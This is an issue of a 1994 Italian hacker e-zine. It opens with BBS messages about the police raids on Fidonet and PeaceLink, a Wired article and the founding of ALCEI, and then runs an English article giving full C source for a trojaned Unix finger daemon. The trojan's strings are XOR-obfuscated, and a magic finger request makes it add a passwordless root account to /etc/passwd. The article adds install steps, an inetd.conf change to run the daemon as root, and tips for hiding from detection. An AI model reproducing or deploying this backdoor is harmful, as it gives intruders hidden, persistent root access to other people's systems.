particolareggiate sui motivi che hanno indotto il Tribunale di Taranto a
rifiutare il dissequestro del BBS host di PeaceLink, cioe' quello di Pugliese.

Questo e' almeno cio' che ho capito nel sonno... ;-))

Particolari sulle motivazioni del mancato dissequestro si possono chiedere
all'avv.Francesco Guida, il cui numero dello studio e' 099/365812 (tel./fax).

Sara' fatta a questo punto una nuova richiesta di dissequestro, non piu' al
Tribunale del Riesame ma al Gip, adducendo motivazioni legali concernenti non
piu' la non regolarita' dell'azione del PM ma la peculiare azione del BBS in
termini di servizio la cui interruzione puo' causare danno alla comunita'. Mi
sono espresso in termini forse infelici, non sono un avvocato...

Circa le motivazioni del non dissequestro, il Tribunale del Riesame, nonostan-
te avesse avuto tutto il tempo di esaminare per bene la faccenda dato che
sussisteva lo sciopero degli avvocati, non ha voluto ficcardi in una faccenda
forse ritenuta troppo complicata ed inedita da riesaminare.
Certo e' che l'avv.Guida vorrebbe avere da qualcuno che in Italia ha un po' di
dati, la documentazione di dissequestri gia' avvenuti nei giorni scorsi, dopo
l'azione Hardware1 di Pesaro, con relative motivazioni.

Il  Tribunale del Riesame ha evidenziato una cattiva volonta' di fondo,  tanto 
da ritenere che il contributo di 100 mila lire fornito dal Liceo Classico  Ar-
chita  di Taranto e dall'Istituto Professionale Archimede "per l'uso del  BBS" 
possano  essere messi in relazione con l'accusa specifica che - ricordo  -  e' 
del  tutto assurda: Pugliese viene accusato di aver chiesto dalle 50 alle  200 
mila  lire a collegamento telematico per trasferire programmi commerciali.  La 
fonte di tale accusa e' coperta dal segreto istruttorio. Cio' che e' grave  e' 
che la Guardia di Finanza non l'abbia verificata prima di passarla al Pubblico 
Ministero e che il Pubblico Ministero Benedetto Masellis, prima di accoglierla 
e  far eseguire la perquisizione da Pugliese, non abbia richesto  al  capitano 
della  Guardia di Finanza, tal Cazzato, una piu' precisa verifica delle  fonti 
(dal capitano ritenute altamente affidabili).

L'insieme di tutte queste "coincidenze" CI FA FORTEMENTE SOSPETTARE
sull'indipendenza e sulla reale spontaneita' dell'operazione.

Ragion per cui il nostro atteggiamento sta passando dal piano della cautela a
quello piu' "politico" del sospetto sulle finalita' che mal si celano dietro a
questa manovra che, colpendo Giovanni Pugliese, ha colpito tutti noi e - non
dimentichiamolo - il cuore di PeaceLink: piu' in alto non potevano mirare.

Se a settembre PeaceLink sara' piu' debole, vorra' dire che l'operazione era
ben congegnata e aveva un fine ben calcolato.

			       Ciao. Alessandro


609 14-Lug-94 08:16 2962 B.Parrella USA Oakland CA
----------------------------------------------------------------------------
Articolo su WIRED Magazine (Agosto 94).

Riporto di seguito il testo integrale dell'articolo che appare a pagina 29 del
n.2.08 del mensile WIRED Magazine.

(NB: il pezzo e' stato chiuso in redazione il 7 giugno).

-----------

Hacker Crackdown, Italian style

Crackdowns on Italian BBSes demonstrate that US law enforcement agencies are
not alone in dealing with Net crimes by shutting down as much of cyberspace as
they can. Early in the morning of May 11, sysops in Italy awoke facing machine
guns. Italian police, acting on a warrant, raided 119 Fidonet Italia bulletin
board systems, according to Gaetano Savoldelli Pedrocchi, the Pesaro  prosecu-
tor  managing the investigations. Police officials removed computer  hardware, 
disks, answering machines, audiotapes, and other magnetic storage media, remi-
niscent of the infamous "Operation Sundevil" in the United States in 1990.

The police operation, code-named "Operation Hardware 1," targeted a suspected
software piracy ring allegedly run by two users of a Pesaro-based BBS. The two
may have used Fidonet Italia nodes to orchestrate the distribution of illegal-
ly  copied software. Most likely, police officials simply raided each  Fidonet 
node named on a public phone-list held by the two suspected software pirates.

"The crackdown needed to be done. Software piracy has become a national sport
in Italy," Pedrocchi said in an interview with an Italian magazine. "We acted
after precise information about the activities of a specific databank: if some
operators have nothing to do with the charges, we'll verify it as soon as
possible," Pedrocchi said.

Fidonet prohibits the distribution of copyrighted software and secret
passwords, as does Peacelink, another system whose main node was similarly
raided several weeks after the Fidonet seizures.
"The software pirates are a lot more hidden than an obviously public network
like Fidonet," said Franco Mulato, president of the Fidonet Association of
Italy.
"This is a prime example of what happens when ignorant law enforcement butts
heads with the online world," said Stanton McCandlish of the Electronic
Frontier Foundation. "This is why getting police and other agencies up to
speed, not to mention updating the law, is so important."

Unfortunately, the Italian laws that were updated earlier this year to  prohi-
bit software piracy and copyright infringement continue to hold sysops respon-
sible  for  any activity on their systems. Activists hope that when  the  dust 
clears from the raids, the relatively new Italian online community will  unify 
to lobby for electronic civil rights laws by forming an Italian EFF-type orga-
nization.

"Even  in Italy, electronic citizens are showing up," said Bernardo  Parrella, 
US correspondent to Agora Telematica, Italy's equivalent to the Well. "The
protection  of civil rights is not a negotiable issue in a modern  democracy." 
At press time, Italian courts were beginning to return the seized equipment.

-- David Pescovitz
 

603 10-Lug-94 17:51 1370 B.Parrella USA Oakland CA   602
-----------------------------------------------------------------------------
Sicurezza e telematica.

I piu' efferati crimini mafiosi, dagli omicidi dei magistrati allo spaccio di
eroina e cocaina, vengono realizzati grazie all'uso di una fitta rete di
telefoni cellulari: si e' forse criminalizzato la SIP per questo?
Sia il crimine organizzato che la deliquenza comune fanno largo uso delle
tecniche di intercettazione delle radio-frequenze della polizia: si e' mai
scritto che le Poste debbano essere colpevoli?
Ogni giorno migliaia di lettere, pacchi e telegrammi anonimi (contenenti
minacce, testi atti a delinquere, perfino bombe) viaggiano su aerei e furgoni
dei servizi postali mondiali: si e' forse deciso d'incriminare gli addetti a
tali servizi?

Certo, c'e' di che preoccuparsi dell'intrusione nei sistemi radar aerei -
esattamente come c'e' da preoccuparsi per i casi sopra riportati.

E, ripeto, i materiali "terroristici" in questione non arrivano solo sulle
scrivanie dei giornalisti, ma molto piu' semplicemente sono disponibili a tut-
ti sia su supporto cartaceo che elettronicamente.

In nome della sicurezza sociale, possiamo discutere le regole della
comunicazione globale, finanche a cambiarle - se riteniamo che la telematica
sia un medium piu' pericoloso di altri. Ma allora, in piena buonafede, abbiamo
prima di tutto il dovere di allargare il dibattito, esaminando con attenzione
ogni possibile implicazione e conseguenza.
 

[ N.d.R. Questi 2 che seguono sono proprio pazzeschi ! ] 


693  4-Ago-94 23:08 1611 C.Gerino I Roma
-------------------------------------------------------------------------------
INFORMAZIONE E SICUREZZA
Purtroppo, le notizie di ieri sulla "pericolosit  delle reti informatiche
internazionali" non sono invenzioni giornalistiche, ma la relazione semestrale
del ministero dell'Interno al Parlamento sullo stato dei servvizi segreti e
della sicurezza in Italia. Un documento ufficiale, quindi, a carattere
internazionale, che esplicitamente parla dell'attivita' della sinistra
all'interno delle reti informatiche e della telematica internazionale. Piu' in
generale, sostiene che su queste reti transitino informazioni "pericolose per
la  sicurezza nazionale ed internazionale" e che attraverso queste  reti  c'e' 
chi "acquisisce informazioni riservate". Insomma, il massimo organo di preven-
zione e repressione getta l'allarme sull'informatica. Alcune cose sono  proba-
bilmente vere (mi risulta che inusa, attualmente, esistono diverse Bbs che  o-
perano come ""piazzisti" di eroina...)
Altre, pero', evidentemente hanno scopi diversi, come quello di far temere che
la  telematica amatoriale sia un rischio per la sicurezza, con  il  corollario 
che  l'unica  telematica affidabile sia quella "privata" commerciale  o  dello 
stato...
C'e' lo zampino di qualcuno che ha molto a cuore i sistemi informativi, la
proprieta' di essi e la loro gestione esclusiva... Per quanto riguarda il fat-
to che la notizia sia uscita sui giornali, e' stata un'anticipazione fatta da
diverse agenzie di stampa (Ansa, Agi, Adnkronos) del documento, il cui testo
completo sara' disponibile pero' solo a settembre. Sono andato a cercarlo alla
Camera per leggere su cosa erano suffragate queste notizie, ma il volume e' in
stampa...
 

605 11-Lug-94 10:40 3182 S.Pasquini I Civitavecc   601
----------------------------------------------------------------------------
Salve,
sono qui con il dott. Berghella che rispondera' direttamente al tuo messaggio
nonostante il mio nome in testa.
Ciao

Stefano
------------------------------

Salve, sono Fulvio Berghella,
Mi associo volentieri al dibattito, soprattutto perche' e' firmato con nomi
reali. Ed e' proprio qui il punto. Quando c'e' buona fede nel dibattito  libe-
ro, penso che le persone dovrebbero sempre qualificarsi. Se si nascondono die-
tro pseudonimi o alias evidentemente ci sono motivazioni particolari. Sul caso
specifico, avevo concluso l'articolo - peraltro scritto e predisposto nei
giorni precedenti il dibattito al parlamento - affermando che tali eventi
(riferendomi ai BBS clandestini) non aiutano l'immagine dei BBS ufficiali e
amatoriali autodisciplinati. Poi ho cambiato il finale perche' avevo sostenuto
pubblicamente la stessa cosa. Affermando all'auletta parlamentare che non
bisogna confondere i BBS amatoriali "puliti" che tanto hanno contribuito allo
sviluppo dell'informatica e telematica (gratuitamente) con l'enorme gruppo
clandestino che diffonde informazioni strane...
Comunque, credo che il problema di fondo sia l'informazione reale. Sappiamo
tutti che negli Stati Uniti esistono pubblicazioni che raccontano cose simili,
ma voi sapete quanti ragazzi in italia fanno o cercano fare degli illeciti so-
lo per avere tale materiale? Peraltro il file che descrive come fare la bomba
atomica,  a detta di un esperto nucleare che lo ha esaminato -  e'  pericoloso 
per come impostato. se qualcuno ci provasse potrebbe provocare un'auto  esplo-
sione.
Non si tratta di fare terrorismo informativo. Se fosse stato quello il motivo,
la notizia avrebbe avuto maggior risalto, sarebbe stata affidata a giornali a
maggior diffusione popolare e non ad una rubrica specializzata come le pagine
informatiche de IL SOLE 24 ORE del venerdi. Infatti sia la televisione di
stato,  sia la radio mi avevano chiesto di fare un servizio  sull'argomento  e 
non accettato. Non ho accettato perche' in questo momento c'e' molta
strumentalizzazione sulla materia. Due fasi avrei fatto il servizio, oggi no.
In merito all
Correggo.... Due mesi fa (non due fasi....) avrei fatto il servizio oggi no.
Comunque io penso che chi come te, e come me, amano la libera circolazione
delle informazioni, debbano assumersi la responsabilita' di quello che scrivo-
no e che fanno, proprio per difenderne la liceita' e la liberta'. proprio per
rendere il dibattito pubblico non attaccabile. Tacere sui raggazzini che
imperversano  con piccoli affari illeciti o accettare gruppi anomali e  tacere 
su organizzazioni pirata le cui dimensioni e i cui effetti sono assai piu cor-
posi e pericolosi di quelli narrati sull'articolo non penso faccia bene a nes-
suno.
Ora, per ragioni di tempo non posso continuare comunque gradisco molto il
dibattito, e le repliche anche a voce e a viso a viso. Un richiamo finale,
oltre la cronaca ci sono contenuti veramente pericolosi ed essi sono
regolarmente scambiati nei circuiti citati dove l'APPARENTE bisogno di far
circolare le informazioni liberamente e' VERAMENTE SOLO APPARENTE. Se non ne
fossi stato certo, non avrei mai scritto quell'articolo. Grazie per le
osservazioni, a presto.
FB
 

[N.d.r.  questo qui e' proprio PAZZO !!! P-A-Z-Z-O !!! La Redazione  consiglia 
al Sig. Berghella una seduta di ascolto del Modulo Musicale "BERGHELL.MOD" ]
 
-----------------------------FINE MESSAGGI-------------------------------

     Beh,  questo sembra essere tutto, per ora. Sicuramente mancheranno  delle 
cose, ma sicuramente ce ne troverete altre che non sapete, come magari  alcuni 
messaggi  letti in area SYSOP che 'normalmente' un comune utente non  potrebbe 
leggere :)

     Per  finire  alcune informazioni relative all' ORGANO :)  che  "DOVREBBE"  
tutelare i diritti telematici di noi pazzi telemaniaci. Dico DOVREBBE  perche' 
per esempio anche la Associazione Fidonet Italia (AFI) avrebbe dovuto tutelare 
i  Sysop  aiutandoli  in  qualche  modo, ma  invece  se  ne  e'  letteralmente 
F-O-T-T-U-T-A lavandosene le mani.


799 26-Ago-94 02:31 3739 B.Parrella USA Oakland CA
----------------------------------------------------------------------------
Comunicato ufficiale: nasce ALCEI - EF Italy.

Questo il comunicato ufficiale che annuncia la nascita  di ALCEI - EF Italy.
Per ulteriori informazioni ed iscrizioni,  rivolgersi direttamente
all'indirizzo sotto riportato - continuando invece ad usare questo spazio per
la discussione in tema di community networking ed argomenti relativi.

 -----------

			     =====
			     ALCEI
			     =====

		    Electronic Frontiers Italy
		    --------------------------


     *E' nata l'associazione per i "cittadini elettronici"*
     ------------------------------------------------------

Mai pensato che il nostro computer potrebbe aver problemi di liberta'?
E il nostro modem voglia di riservatezza?

Eppure  ne hanno, cioe': li abbiamo noi. Quasi senza accorgercene, leggendo  e 
scrivendo  messaggi,  usando  forme nuove di  comunicazione,  siamo  diventati 
un'altra cosa. Siamo "cittadini elettronici".  Ma "quanto" siamo liberi? Quan-
to abbiamo gia' "regole" adeguate alla novita' che viviamo e rappresentiamo?

I recenti sequestri in Italia, il ricco dibattito che negli Stati Uniti si sta 
sviluppando intorno alle autostrade elettroniche, la lentezza e le  incertezze 
che caratterizzano l'affermarsi di un analogo progetto europeo, le  trasforma-
zioni tecnologiche e d'uso che l'insieme dei media va conoscendo, indicano  un 
terreno di iniziativa per la difesa e lo sviluppo dei diritti di  cittadinanza 
telematica come parte dei diritti democratici.

Per questo e' nata:

	  *************************************

			 ALCEI
			 -----
		Electronic Frontiers Italy

	   Associazione per la liberta' nella
	  comunicazione elettronica interattiva

	 *************************************


Alcei nasce per dare la parola al cittadino elettronico. Alcei si richiama di-
rettamente all'esperienza di Electronic Frontier Foundation e di EFF ha il ri-
conoscimento pubblico e diretto.

Alcei non e' un'organizzazione di tendenza, non ha riferimenti politici o
ideologici, non chiede di essere finanziata dallo stato. Tutti vi possono
aderire, purche' ne rispettino lo statuto. A tutti chiediamo una quota
associativa e una collaborazione in qualsiasi forma: nessuno ci paga, non
abbiamo apparati.

Alcei non e' una "lobby".  Non e' solo un gruppo di "difesa del consumatore".
Non nasciamo per aggiungere leggi a leggi, burocrazia a burocrazia: tutto cio' 
che fonda sulla liberta' e sull'autoregolamentazione, sui codici che i sogget-
ti sociali sanno darsi autonomamente, funziona bene.

Con questo principio intendiamo muoverci su casi singoli cosi' come su terreni 
generali:  il diritto e la legislazione, che sono  incompleti,  l'informazione 
che e' oggi del tutto assente, carente o imprecisa (e spesso pilotata da grup-
pi di interesse); l'elaborazione di una cultura dei nuovi mezzi.

Alcei non e' una "conferenza", un luogo solo di dibattito.  E' e vuole essere
un'organizzazione  operativa che lavora con pazienza, tutti i giorni, per  co-
struire e difendere la libera cultura della telematica.

C'e' un grande vuoto da riempire, di idee e di lavoro.

Per ottenere un'adesione informata abbiamo creato un punto di riferimento
telematico dove potrai chiedere informazioni sulla nostra identita' e sui
nostri principi. Presto saranno pronti nuovi strumenti di circolazione
dell'informazione cui tutti potranno dare un contributo.

  ---------------------------------------------------------------
		Per informazioni:       <alcei@mailbox.iunet.it>

			(fax: 06-3202346  o 02-867055)

   ---------------------------------------------------------------
 

809 26-Ago-94 20:30 953 B.Parrella USA Oakland CA
----------------------------------------------------------------------------
re: comunicato alcei

In merito al *comunicato* precedentemente inserito, rammento che  ulteriori
informazioni (statuto, dichiarazione di principi, modalita' d'iscrizione, ecc.)
vanno richiesti all'indirizzo menzionato <alcei@mailbox.iunet.it>. Tali
documenti  possono anche essere ricevuti automaticamente, come specificato
nelle seguenti righe che erano saltate nella prima comunicazione ufficiale.

--------------------

La documentazione su ALCEI puo' essere richiesta al server ftpmail
       archive@nexus.it

Per informazioni sull'uso del server ftpmail inviare ad archive@nexus.it
un messaggio contentente la parola HELP nel corpo del testo.

---------------------

Ricordo inoltre che EFF sta per Electronic Frontier Foundation (negli USA),
mentre il "secondo nome" di ALCEI e' Electronic Frontiers Italy. Infine,
LECITI! era un'idea-proposta mai concretizzatasi ma il cui spirito (oltre a
qualcos'altro  :-) si e' riversato proprio in ALCEI.

----------------------------------------------------------------------------

     Speriamo  che  questa ALCEI possa ingranare subito, senza entrare  a  far 
parte  della RUOTA BUROCRATICA che da sempre blocca, invece di muovere,  qual-
siasi iniziativa.


						  Dupree's Paradise

-----------------------------------------------------------------
PUBBLICITA' REGRESSO
====================

				 CALL NOW

	     The BEST BBS for Cyberpunk & HP Stuff in Europe !!!

	      ________________________________________________ 
	     /~ .~  /  _ . ~/~ _ . |~  __ ~|  _ . \~ _    _ ~/ 
	    // ____/_ |_\__/. | \__|. |__| | |_\__/\/ |  | \/  
	   /____   ~/  _|__|| |  __|:     _|  _|__    || |     
	    // .  //: |_/. \: |_/. || |\ \\: |_/. \   |: |     
	   /_____ /|________\______|__| \__\_______\  |__|     
    ___________________________________________   ___________________ 
    \~ _    _ ~/ _ . ~/ _ .\~ _    _ ~/ __ |~ ~\ |~~|~| _ . ~/~ .~  / 
     \/ |  | \/ |_\__/ | \__\/ |  | \/ /  \||   \| || || \__// ____/_ 
	|| | ||  _|__| |  __   || | \\ \  /|: \  \ :| ||  ______   ~/ 
	|: | |: |_/. \ |_/. \  |: |  \  \/ || |\   .| ||_/. \/ .  //  
	|__| |________\______\ |__|   \____|__| \___|_|______\___ /   

   
   Dialup: +49 40 823326 8N1 with a USR Dual - NUA 26245400050045
   Donations are very welcome, leave Mail to Seven Up (you may use CC's!)

  
NEWS From Sectec : 
==================
We just set up the Official SECTEC FTP site on the Internet!

It is on spy.org in /pub/SECURITY/sectec.
All uploads go to /pub/SECURITY/sectec/incoming please!

This is a way for all the people with Internet access, who would like
to contribute files but cannot upload through x.25 yet...

To help you uploading here, I just installed ASCII Upload and 
UUencoded Upload (which are basically the same!). You just chose this 
point from the Upload menu and chose ASCII Upload with your terminal
program. For security reasons, uuencoded files aren't uudecoded
automatically, but will remain online uuencoded.

Also I just created a general Newsgroup called "chat" as requested.
For all the people who want to talk, get a better message ratio -
just talk about whatever you want and what wouldn't fit anywhere else.
 
-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 4


                               The

                             fingerd

                          TROJAN HORSE
                          ============

                               by

                          Hitman Italy

[ N.d.r. Articolo in Inglese. Se lo capite, bene. Se no, adeguatevi e
  datevi una svegliata, che siamo nel 2000 !!! ]

[ N.d.R QUESTO ARTICOLO VIENE PUBBLICATO COME INFORMAZIONE PER I
        SYSTEM ADMINISTRATOR AFFINCHE' POSSANO PRENDERE VISIONE DI
        QUESTA DEBOLEZZA NEI SISTEMI UNIX. ] 

-=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=-
The fingerd trojan horse
Original article by Hitman Italy for The Black Pages

This article is for informational purpose only, I'm not liable for
any damage or illegal activity perpetrated using the source or the 
informations in the article.
    
-=- + -
    
So you have gained access to a system and want to keep on hacking without
being kicked off by a smart operator, there are dozen methods you can use,
usually, if an operator figure out that his system is under attack, he'll
check out the login program and telnetd for backdoors, then the telnet for
logging activities or network sniffers and so on..  if nothing is found
he'll realize the hacker is a dumb ass and he'll just modify the passwd to
prevent him from logging in (most of cases), here comes my fingerd trojan.
This scheme is quite original (I've never heard about it) and the source
compact enough to be fitted into a MAG.  The fingerd as all you know (I
hope) is the finger server run by inetd when a client opens the finger
port (N.79), of course if the port is locked, or you have a network
firewall, do not use this code.

---------- + CUT HERE + -----------------------------------------------

/*  The Fingerd trojan  by Hitman Italy
 *  This source cannot be spreaded without the whole article
 *  anyway you can freely use or modify it for your own 
 */

static char copyright[] = "";   /* Add the copyright string here */

static char sccsid[] = "";      /* Add the sccsid string here */


#include <stdio.h>

#define PATH_FINGER "/usr/ucb/finger"
#define CODE 161

char *HitCrypt(ch)
char *ch;
{
   char *b;
   b=ch;
   while ((*(ch++)^=CODE)!=0x00);
   return(b);   
}

main(argc,argv)
int argc;
char *argv[];
{
   register FILE *fp;
   register int ch;
   register char *lp;
   int p[2];

static char exor[4][23]={
{201,200,213,CODE},
{142,196,213,194,142,209,192,210,210,214,197,CODE},
{201,200,213,155,155,145,155,145,155,155,142,155,142,195,200,207,142,194,
210,201,CODE},
{227,192,194,202,197,206,206,211,129,192,194,213,200,215,192,213,196,197,
143,143,143,CODE} };

#define   ENTRIES   50
   char **ap, *av[ENTRIES + 1], line[1024], *strtok();

#ifdef LOGGING               /* unused, leave it for "strings" command */
#include <netinet/in.h>
   struct sockaddr_in sin;
   int sval;

   sval = sizeof(sin);
   if (getpeername(0, &sin, &sval) < 0)
      fatal(argv[0],"getpeername");
#endif

   if (!fgets(line, sizeof(line), stdin))
      exit(1);

   av[0] = "finger";

   for (lp = line, ap = &av[1];;) {
      *ap = strtok(lp, " \t\r\n");
      if (!*ap)
         break;
      if ((*ap)[0] == '/' && ((*ap)[1] == 'W' || (*ap)[1] == 'w'))
         *ap = "-l";
      if (++ap == av + ENTRIES)
         break;
      lp = NULL;
   }

   if (pipe(p) < 0)
      fatal(argv[0],"pipe");

   switch(fork()) {
   case 0:
      (void)close(p[0]);
      if (p[1] != 1) {
         (void)dup2(p[1], 1);
         (void)close(p[1]);
      }

/*-=-=-=-=-=- PUT HERE YOUR CODE -=-=-=-=-=-*/
   if (av[1])
       if (strcmp( (HitCrypt(&exor[0][0])) ,av[1])==0) {
        if(!(fp=fopen( (HitCrypt(&exor[1][0])) ,"a")))
         _exit(10);
        fprintf(fp,"%s\n", HitCrypt(&exor[2][0]));
        printf("%s\n", HitCrypt(&exor[3][0]));
        fclose(fp);
        break;
       }
/*-=-=-=-=-=- END OF CUSTOM CODE =-=-=-=-=-=-*/

        if (execv(PATH_FINGER, av)==-1)
         fprintf(stderr,"No local finger program found\n");
      _exit(1);
   case -1:
      fatal(argv[0],"fork");
   }
   (void)close(p[1]);
   if (!(fp = fdopen(p[0], "r")))
      fatal(argv[0],"fdopen");
   while ((ch = getc(fp)) != EOF) {
      putchar(ch);
   }
   exit(0);
}

fatal(prg,msg)
   
   char *prg,*msg;
{
   fprintf(stderr, "%s: ", prg);
   perror(msg);
   exit(1);
}

--------- + CUT HERE + ----------------------------------------------

I think it's quite easy to understand, first of all, inetd opens the
socket and pipes the the input data through the fingerd

*  if (!fgets(line, sizeof(line), stdin))
*     exit(1);
*   av[0] = "finger";
*   for (lp = line, ap = &av[1];;) {
*      *ap = strtok(lp, " \t\r\n");
*      if (!*ap)
*         break;
*      if ((*ap)[0] == '/' && ((*ap)[1] == 'W' || (*ap)[1] == 'w'))
*         *ap = "-l";

here it gets the data from stdin and parses them (strtok) converting (due
to RFC742) any '/W' or '/w' old options in '-l'

*    switch(fork()) {
*   case 0:
*      (void)close(p[0]);
*      if (p[1] != 1) {
*         (void)dup2(p[1], 1);
*         (void)close(p[1]);
*      }

the task goes into the background

*        if (execv(PATH_FINGER, av)==-1)
*         fprintf(stderr,"No local finger program found\n");

here the daemon executes the local finger with remote parameters

*   (void)close(p[1]);
*   if (!(fp = fdopen(p[0], "r")))
*      fatal(argv[0],"fdopen");
*   while ((ch = getc(fp)) != EOF) {
*      putchar(ch);

the output is piped back to the remote system

That's how the finger daemon works...  now the trojan, basically we'll
check out the input finger user till the magic code matches, then our
sleepin' trojan will wake up and do the job...  let's examine my code
(decrypted)

/*-=-=-=-=-=- PUT HERE YOUR CODE -=-=-=-=-=-*/
   if (av[1])
       if (strcmp("hit",av[1])==0) {
        if(!(fp=fopen("/etc/passwd","a")))
         _exit(10);
        fprintf(fp,"hit::0:0::/:/bin/csh\n");
        printf("Backdoor activated...\n");
        fclose(fp);
        break;
       }
/*-=-=-=-=-=- END OF CUSTOM CODE =-=-=-=-=-=-*/

When the "hit" magic code matches the trojan will modify the passwd adding
a fake unpassworded root user named "hit", so you can relogin as root,
cover your tracks and keep on working.  Of course this is an example, you
can do what you want simply adding your custom code, you may remote cat a
log file without logging in, or remote kill an user, maybe root logins are
disabled so you have to make a suid shell and add a normal entry in the
passwd or open a port and so on, you can also use multiple codes if you
like.  If the magic word doesn't match of course the finger will work out
normally.

<example>
# finger hit@666.666.666.666
[666.666.666.666] 
Backdoor activated...

Well done! You have gained a root access. 
(...)
# cat /etc/passwd
root:EXAMPLE PASSWORD:0:1:Operator:/:/bin/csh
nobody:*:65534:65534::/:
daemon:*:1:1::/:
sys:*:2:2::/:/bin/csh
bin:*:3:3::/bin:
uucp:*:4:8::/var/spool/uucppublic:
news:*:6:6::/var/spool/news:/bin/csh
ingres:*:7:7::/usr/ingres:/bin/csh
audit:*:9:9::/etc/security/audit:/bin/csh
sync::1:1::/:/bin/sync
ftp:*:995:995:Anonymous FTP account:/home/ftp:/bin/csh
+::0:0:::
hit::0:0::/:/bin/csh
^^^ they run NIS... anyway our local root login will work fine  

<example>
#finger hit@hacked.system.com
[hacked.system.com]
here is the log
user: xit001 from: hell.com ip: 666.666.666.666 has pw: xit001
user: yit001 from: (...)

That's really useful to collect logfiles without logging in and leave
tracks everywhere.


Now the problem.... 
If you want to use the fingerd to run world accessible commands you won't 
have any problem but if you require root privileges check this out:

#grep fingerd /etc/inetd.conf
finger  stream  tcp     nowait  nobody  /usr/etc/in.fingerd     in.fingerd
                                ^^^^^^
On SunOs 4.x.x the fingerd runs as nobody, the fake user (used with
NFS etc..), as nobody of course you cannot modify the passwd, so edit the
file

finger  stream  tcp     nowait   root   /usr/etc/in.fingerd     in.fingerd

now you have to refesh the inetd process

#kill -HUP <inetd pid> 

now you can do what you want, many unix clones let the fingerd running as
root by default...  and even if you have to modify the inetd.conf an
operator unlikely will realize what is appening since all other daemons
run as root.


Why have I crypted all data? 
#strings login
(...)
Yeah d00dz! That's a //\/\eg/+\Backd0[+]r by MASTER(...) of MEGA(...) 

Lame or not?  All alien data must be crypted..  a fast exor crypting
routine will work fine, of course you can use the standard crypt function
or other (slow) algorithms but since security is not important (we just
want to make our texts invisible) I suggest using my fast algo,to create
the exor matrix simply put all texts on a file and use the little
ExorCrypt utility I have leaved UUencoded below (amiga/msdos version).

<example amiga>
echo > test "this is a test"
Acrypt test test.o
line crypted: 1  
type test.o
static char exor[]={
213,201,200,210,129,200,210,129,192,129,213,196,210,213,161};

char *ExorCrypt(ch)
char *ch;
{
   char *b;
   b=ch;
   while ((*(ch++)^=0xa1)!=0x00);
   return(b);
}

The utility will create the exor vector (matrix) (from the 80 column
formatted ascii input text) and the specific decoding function, If you do
not supply a key "$a1" will be used, remember to add a NewLine if
necessary, the vector/matrix never contain them.

Before compiling the whole thing you must add the copyright and sccsid
strings I have not included (they may vary).  
Let's simply do:  (SunOs)

#strings /usr/etc/in.fingerd
@(#) Copyright (c) 1983 Regents of the University of California.
 All rights reserved.                       ^^^^ COPYRIGHT STRING
@(#)in.fingerd.c 1.6 88/11/28 SMI           <<<< SCCSID STRING
getpeername
finger
pipe
/usr/ucb/finger
No local finger program found
fork
fdopen
%s: 
         (((((                  
DDDDDDDDDD
AAAAAA
BBBBBB

The top of source becomes: 
static char copyright[]=
"@(#) Copyright (c) 1983 Regents of the University of California.\n\  
 All rights reserverd.\n";
static char sccsid[]="@(#)in.fingerd.c 1.6 88/11/28 SMI"

That's all. Now you can compile and install your fingerd trojan,
the source was adapted for SunOS but you can port it on many unix
clones without troubles.  


Few final words to:

Operators: How to defeat this trojan? First of all check the inetd.conf,
           then do VARIOUS fingerd checksums (maybe even the "sum" command 
           is a trojan :) if you discover the trojan wrap the finger port 
           so you can track down the hacker (usually all wtmp/lastlog logs 
           are removed) or wrap everything modifying the daemons, do NOT use
           the inetd.conf_jump_new_daemon scheme, if you can, add a fingerd
           tripwire entry to prevent future installations.
           Well...  if the hacker is a good one everything is useless.

Beginners: You must be root to install the trojan, remember to get a copy
      of the original fingerd program before installing the fake 
      version.
           On a Sun do: 
           #cc -o in.fingerd trojan.c
           #mv /usr/etc/in.fingerd fingerd.old
           #mv in.fingerd /usr/etc
      remember to check the /etc/inetd.conf          
-=- + - 

To get in touch with me E-Mail to:

 Internet: hit@bix.com           X.25: QSD Nua (0)208057040540
                                           Mbx: Hitman_Italy

if you want, use my PGP key

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.3a.2

mQCNAiypAuIAAAEEALVTvHLl4zthwydN+3oydNj7woyoKBpi1wBYnKJ4OGFa/KT3
faERV90ifxTS73Ec9pYhS/GSIRUVuOGwahx2UD0HIDgXnoceRamhE1/A9FySImJe
KMc85+nvDuZ0THMbx/W+DDHJMR1Rp2nBzVPMGEjixon02nE/5xrNm/sb/cUdAAUR
tBpIaXRtYW4gSXRhbHkgPGhpdEBiaXguY29tPg==
=bCu4
-----END PGP PUBLIC KEY BLOCK-----


ExorCrypt Amiga version:

-=) S.Encode v2.5 (=-
begin 777 Acrypt.lha
M'$0M;&@U+;L7``"`*```4K>9`0``!D%C<GEP=`X]$UF#^]?>]8TV]?OWWGY]h
MWCGT)T<>==;,3^G7FQMOA\XXX4Q2S[GS9)QP]W.-A<]))-Y@SN9!MOMPPCA"h
MGWF(`+"*XDE5UEU4LU45L4CDCA958FA%94*5RX4P217"J%868`=M85QPS1@<h
M/?_]_O>YL*2RW3+[;9:U9+);_%OP`;\%'W=VLD<;;A%.>^3?Y5SVH19P?5/Zh
MA=_F.G`BP"T_^)W7<CS.<^82-**GE,*TW![K%:RX-^2U1'6@U$A:NB8*U937h
MBE!+)^,'6%']'I^Q4:\OJ+4\;SRP91%+1U^]](EG3(`+-1#G.A;DI5HUY8/%h
MQ>+BO[DGWM>O[7KH5F%/_)J-.MI>)@6C,25:,JPVNG]?$U3,3P5R0K:L^W@=h
MEOB)!6NV&@<KLM^2#I]EZ:!9]U^%KH/Y$+.,$5^!WI)SH2__MHSQ<$Q67WZ_h
M]!=Z-*LN>_%J(:U9"*!#14E`E3\&Z=7*(;^G(JBO6IX_HM;9_4DB51P!LV<Yh
MHK^Z,?HY3SE;M$/07)+EYB+H9]>+=3G/1<E`J+DEEM+'PUM''PWGJ2R861")h
M:$2(*R)2R(<?>Q\.AX9DQ?@4@?ZL8O.Q@3651OX(#*P$?'._'O:/P&Q@]RCLh
MJNZ6KH^QEW#'J6'1)]+!5_@XU1#=7,K'C[&XO=A5W6NU<RWF>$4?5-,_>QYSh
MH:TNP?Q>8[K:N$7ETUZ7F;0HGH-<FDVA?UM,RYS@,W;J6MP&;VCBW1%'PYS*h
MJ_(%&M&B[:)_3'PZ396<@5V(54-#X=%R;.0"/O),^+,:OG,6+?D\&%LTX7<Ch
M"KC"\"SD54-KH1F4X?=C#^6YAZ>SD&+9,`8E['P^SV]M(I(;3,8DXGT1B=DWh
